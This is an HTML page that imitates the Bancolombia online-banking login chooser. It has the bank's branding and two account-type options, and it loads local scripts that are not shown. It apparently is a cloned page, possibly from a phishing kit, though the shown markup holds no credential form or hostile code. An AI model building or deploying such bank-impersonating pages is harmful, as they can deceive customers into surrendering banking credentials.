<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Autenticación Bancolombia</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
    <link rel="stylesheet" href="styles/styles.css">
    <link rel="icon" type="image/png" href="./media/logo.png" />
    <script src="../../js/functions.js"></script>
</head>

<body>

    <header class="header">
        <img src="media/Bancolombia.ae56ff7f0e9a3fd0046b5f264dc42c79.svg" height="20rem" alt="">
        <div class="logout">
            <a href="" class="out">
                <p>Salir</p>
            </a>
            <img class="out-image" src="media/ExitIcon.35b2413abce276ac588d59c3ef6b1251.svg" alt="">
        </div>
    </header>

    <section class="welcome-div">       
            <div class="login-h">
                <h5>Iniciar Sesión</h5>
            </div>
            <div class="choose-login">
                <p>Elige cómo quieres continuar:</p>
             </div>
    </section>

    <section class="buttons">
        
        <div class="personas" id="personas">
            <div class="text">
                <p class="boldText" style="margin-bottom: -0.6rem;">Bancolombia Personas</p>
                <p class="normalText" style="margin-top: 7px;">Si manejas cuenta o productos personales.</p>
            </div>
            <div class="arrow">
                <img src="media/faChevronRight.0dc234203984d356c34897837c59674a.svg" alt="" srcset="">
            </div>
        </div>

        <div class="mano" id="mano">
            <div class="text-mano">
                <p class="boldText" style="margin-bottom: -0.6rem;">Bancolombia A la mano</p>
                <p class="normalText" style="margin-top: 7px;">Si usas esta aplicación.</p>
            </div>
            <div class="arrow-mano">
                <img src="media/faChevronRight.0dc234203984d356c34897837c59674a.svg" alt="" srcset="">
            </div>
        </div>

    </section>
    <br>
    <section class="question">
        <a href="">¿Qué opción debo elegir?</a>
    </section>

    <section class="back">

    </section>

    <script src="./js/home.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz"
        crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js"
        integrity="sha384-I7E8VVD/ismYTF4hNIPjVp/Zjvgyol6VFvRkX/vR+Vc4jQkC+hVqc2pM8ODewa9r"
        crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.min.js"
        integrity="sha384-0pUGZvbkm6XF6gxjEnlmuGrJXVbNuzT9qBBavbLwCsOGabYfZo0T0to5eqruptLy"
        crossorigin="anonymous"></script>
</body>

</html>
